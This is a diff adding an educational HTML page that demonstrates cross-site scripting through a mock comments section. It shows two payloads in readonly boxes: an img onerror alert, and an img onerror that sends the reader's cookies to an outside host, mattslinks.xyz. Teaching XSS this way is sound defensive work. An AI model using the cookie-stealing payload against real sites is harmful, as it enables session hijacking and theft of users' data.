@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <link rel="stylesheet" type="text/css" href="style.css">
+    <title>XSS Examples</title>
+</head>
+<body>
+    <h1>Cross Site Scripting Examples</h1>
+    <p>
+        This page shows you how someone can steal your infomration if they are able to inject javascript onto the page.
+    </p>
+    <p>
+        This example uses a 'comments' sectioon as the vector for the evil scripts. Imagine that a malicious user has added a comment to the page - copy paste the attacker code into the comment box to see the effects.
+    </p>
+    <hr>
+
+    <h2>Display Alert</h2>
+    <p>In this attack we print a message to the user's screen</p>
+    <h4>Evil Code (post as a comment)</h4>
+    <textarea readonly="True"><img src='x' onerror="alert('You got haaaacked')"></textarea>
+    <h4>User comments</h4>
+    <div id="comment-box-0" class="comment-box">
+        <div class="comment">Anon says: I liked it!</div>
+    </div>
+    <textarea id="comment-text-0" placeholder="Write comment here"></textarea>
+    <button id="comment-btn-0" onClick="">Submit</button>
+    <hr>
+
+    <h2>Steal Cookies</h2>
+    <p>In this attack we redirect to another site that is owned by the attacker, passing the user's cookies to the to attacker's site. In this case you have a secret cookie 'secretCookie=123456'</p>
+    <h4>Evil Code (post as a comment)</h4>
+    <textarea readonly="True"><img src='x' onerror="window.location = 'https://mattslinks.xyz?stolenCookies='+encodeURI(document.cookie)"></textarea>
+    <h4>User comments</h4>
+    <div id="comment-box-1" class="comment-box">
+        <div class="comment">Anon says: I liked it!</div>
+    </div>
+    <textarea id="comment-text-1" placeholder="Write comment here"></textarea>
+    <button id="comment-btn-1" onClick="">Submit</button>
+    <hr>
+
+    <script src="main.js" type="text/javascript"></script>
+</body>
+</html>
